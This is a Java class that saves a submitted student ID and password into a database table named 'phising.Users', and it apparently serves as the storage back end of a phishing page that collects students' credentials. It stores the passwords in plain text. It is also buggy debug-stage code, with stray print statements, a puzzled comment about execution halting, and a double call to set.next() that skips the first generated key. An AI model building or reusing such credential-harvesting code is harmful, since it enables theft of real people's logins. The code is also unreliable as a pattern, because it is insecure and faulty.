package com.example.demo;

import com.example.demo.DatabaseConnection;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.ResultSet;

public class Bean {

    private String id;
    private String password;

    public Bean(String id, String password){
        this.id = id;
        this.password = password;
    }

    public String getId(){return id;}

    public String getPassword(){return password;}

    public int store(){
        Connection dbConnection = DatabaseConnection.tryConnecting();

        if(dbConnection == null){
            System.out.println("never connected");
            return 0;
        }

        try{
            System.out.println("connected and in query");
            PreparedStatement statement = dbConnection.prepareStatement(
                    "INSERT INTO phising.Users (student_id, password) VALUES (?, ?)",
                    PreparedStatement.RETURN_GENERATED_KEYS
            );

            System.out.println("got the statement");

            statement.setString(1, getId());
            statement.setString(2, getPassword());

            System.out.println("executing update");
            statement.executeUpdate();

            System.out.println("do you continue?");
            // it doesn't continue after the execute update which is odd

            System.out.println("setting result set");
            ResultSet set = statement.getGeneratedKeys();

            System.out.println("what is set.next(): " + set.next());

            if(set.next()){
                System.out.println("went into the query");
                return set.getInt(1);
            }
            else {
                return 0;
            }

        }
        catch (SQLException x){
            return 0;
        }
    }
}
